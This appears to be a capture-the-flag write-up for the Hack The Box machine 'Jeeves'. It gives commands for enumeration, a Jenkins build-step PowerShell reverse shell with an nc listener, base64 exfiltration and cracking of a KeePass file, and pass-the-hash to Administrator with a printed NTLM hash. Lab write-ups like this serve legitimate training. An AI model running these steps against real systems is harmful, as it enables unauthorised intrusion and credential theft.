+++
author = "Blue Pho3nix"
title = "Jeeves"
categories = ["htb"]
tags = [ "Medium", "Windows", "OSCP Prep" ]
image = "img/jeeves-icon.png"
+++

![](img/intro.png)

# Solution

## Finding the vulnerability

`nmap` shows open ports 80, 135,445, and 50000. <br>
[Video timestamp 0:10](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=10s)

```python
nmap -Pn -p- --min-rate=1000 -T4 10.10.10.63 -vv -oN ports
```

![](img/1.png)

We run `-sCV` on the open ports.

```python
ls
```

```python
ports=$(cat ports | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```python
echo $ports
```

![](img/2.png)

```python
nmap -p$ports 10.10.10.63 -sCV -oN version-basescripts
```

![](img/3.png)

---

We try to login to SMB, but it requires a password. <br>
[Video timestamp 0:15](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=15s)

```shell
smbclient -N -L \\\\10.10.10.63\\
```

![](img/9.png)

---

Port 50000 gives the 404 Not Found error listed with nmap. <br>
[Video timestamp 0:25](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=25s)

![](img/4.png)

---

Port 80 also gives an error, this time as an image. <br>
[Video timestamp 0:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=32s)

![](img/5.png)

![](img/6.png)

![](img/7.png)

![](img/8.png)

---

We run `ffuf` and find a `/askjeeves` directory on port 50000 that's running Jenkins. <br>
[Video timestamp 1:40](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=100s)

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ -recursion -recursion-depth 1 -o ffuf
```

![](img/10.png)

![](img/11.png)

## Foothold

We find a RCE exploit for Jenkins at [Jenkins RCE Creating Modifying Project](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-project) <br>
[Video timestamp 2:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=139s)

1. Create a `New Item`

![](img/12.png)

2. `Enter an item Name`, choose `freestyle project`, and click `OK`.

![](img/13.png)

3. Scroll down to build and add the `Execute Windows batch command` build step.

![](img/14.png)
![](img/15.png)

4. Create a `PoweShell #3 base64` encoded reverse shell at [https://www.revshells.com/](https://www.revshells.com/)

![](img/16.png)

5. Paste the rev shell into `Command` and click `Apply`.

![](img/17.png)

6. Start your listener with `rwlrap`

```python
rlwrap -cAr nc -lvnp <your chosen port>
```

7. Navigate to `http://10.10.10.63:50000/askjeeves/job/<your job's name>/` and click `Build Now`. This gives us a shell as user kohsuke.

![](img/18.png)

We get the user flag on `c:\users\kohsuke\desktop`. <br>
[Video timestamp 4:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=259s)

```cmd
dir c:\users\
```

![](img/19.png)

```cmd
cd c:\users\kohsuke\desktop
```

```cmd
dir
```

![](img/20.png)

---

## Privilege Escalation

We look around and find a `KeePass`file in the `c:\users\kohsuke\documents`directory. <br>
[Video timestamp 4:28](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=268s)

```cmd
cd ..\Documents
```

```cmd
dir
```

![](img/21.png)

---

We move the file over to our attack box with base64 in powershell. <br>
[Video timestamp 4:40](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=280s)

**On Windows:**

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\users\kohsuke\documents\ceh.kdbx" -Encoding byte))
```

![](img/22.png)

**On our attack box:**

```python
echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEA<snip>" | base64 -d > CEH.kdbx
```

![](img/23.png)

We have `CEH.kdbx` on our local machine.

```python
ls
```

![](img/24.png)

![](img/25.png)

---

We use `kpcli` to get the passwords. <br>
[Video timestamp 5:37](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=337s)

```python
sudo apt update && sudo apt install kpcli
```

We need the `CEH.kdbx` master password.

```python
kpcli
```

```shell
open CEH.kdbx
```

![](img/26.png)

`keepass2john` helps us out.

```python
keepass2john CEH.kdbx > CEH.kdbx-hash
```

![](img/27.png)

Then we use `john` to get the master password.

```python
john CEH.kdbx-hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](img/28.png)

Now it's time to grab the passwords from this `CEH.kdbx` file.

```python
kpcli
```

```shell
open CEH.kdbx
```

After entering the `moonshine1` password we find 7 password entries.

```
find .
```

![](img/29.png)

We find a hash in entry `0`

```
show -f 0
```

We put the hash in a file for Pass The Hash attacks.

```python
echo "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" > hashes
```

![](img/30.png)

---

We use `crackmapexec` to test the hash on the smb server. We find out the hash works on administrator. <br>
[Video timestamp 7:17](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=437s)

```python
crackmapexec smb 10.10.10.63 --local-auth -u Administrator -H hashes
```

![](img/31.png)

---

We use `impacket-psexec` to get on the server as Administrator. <br>
[Video timestamp 7:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=452s)

```python
impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

![](img/32.png)

---

Instead of a root flag, we find `hm.txt`. <br>
[Video timestamp 7:51](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=471s)

```cmd
cd c:\users\administrator\desktop
```

```cmd
dir
```

![](img/33.png)

The file says `"The flag is elsewhere. Look deeper"` .

```cmd
type hm.txt
```

![](img/34.png)

Let's look deeper into the `hm.txt` file, then.

```cmd
dir /r
```

![](img/35.png)

---

We read the `root.txt`stream with `CMD` or `PowerShell`. <br>
[Video timestamp 8:21](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=501s)

**CMD:**

```cmd
more < hm.txt:root.txt:$DATA
```

**PowerShell:**

```powershell
powershell Get-Content hm.txt -stream root.txt
```

![](img/36.png)
